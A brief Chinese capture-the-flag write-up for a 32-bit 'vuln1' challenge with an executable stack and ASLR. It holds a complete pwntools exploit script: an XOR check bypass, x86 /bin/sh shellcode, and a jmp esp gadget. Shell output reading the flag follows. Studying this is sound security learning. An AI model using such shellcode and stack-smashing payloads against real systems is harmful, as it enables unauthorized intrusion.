# pwn---栈可执行且开启了ASLR的利用思路和脚本

因为栈可执行，开启了ASLR，这里使用栈上写shellcode，jmp esp的ROP方法来实现  

```python
# coding:utf8

'''
一次输入输出

ubuntu@ubuntu:~/Desktop$ ./vuln1
You are lucky. Full moon tonight. You hear some noises. 
Wait! There's something there you can't see! It's a door! 
A voice whispers: "The answer is 3342201722. Speak the question and enter."
> 1839159760
The dungeon shakes as the door opens. You feel eyes gazing out at you.
> 
hello
An energized cloud of dust begins to coalesce.


'''

import re
from pwn import *

# v3 = 0
# for i in range(8):
#     v3 = 16 * v3 + 10
v3 = 0xaaaaaaaa


# context.log_level = 'DEBUG'

# conn = process('./vuln1')
conn = remote('canyouhack.us', 10001)

if args.G:
    gdb.attach(conn, 'b * 0x0804868F')

vuln1 = ELF('./vuln1')

# A voice whispers: "The answer is 4093276769. Speak the question and enter."
conn.recvuntil('A voice whispers:')
line = conn.recvuntil('Speak the question and enter."')
num = int(re.findall(r'The answer is (.*)\. Speak the question and enter\.', line)[0])
print num

ans = num ^ v3
conn.sendline(str(ans))

conn.recvuntil('The dungeon shakes as the door opens. You feel eyes gazing out at you.')


shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"

sub_esp_jmp = asm('sub esp, 0x52;jmp esp')
jmp_esp = 0x08048640
payload = shellcode_x86 + (
    0x4e - len(shellcode_x86)) * 'b' + p32(jmp_esp) + sub_esp_jmp
conn.sendlineafter('> ', payload)
conn.interactive()

'''
$ ls -lh
total 56K
-r--r----- 1 user0 1002   73 Oct 20  2017 flag.0
-r--r----- 1 user1 1003   73 Oct 20  2017 flag.1
-r--r----- 1 user2 1004   73 Oct 20  2017 flag.2
-r-xr-x--- 1 root  1001 7.6K Oct 20  2017 vuln0
-r-xr-x--- 1 root  1001 5.5K Oct 20  2017 vuln1
-r--r----- 1 root  1001  23K Oct 20  2017 vuln1.txt
-r-xr-x--- 1 root  1001 3.5K Oct 20  2017 vuln2
$ whoami
user1
$ cat flag.1
Congratulations! Here is your flag: c44f655e-bc7d-4471-8e30-71b3a5b8d59c

'''
```

参考链接: https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/#1  


2019/10/28  
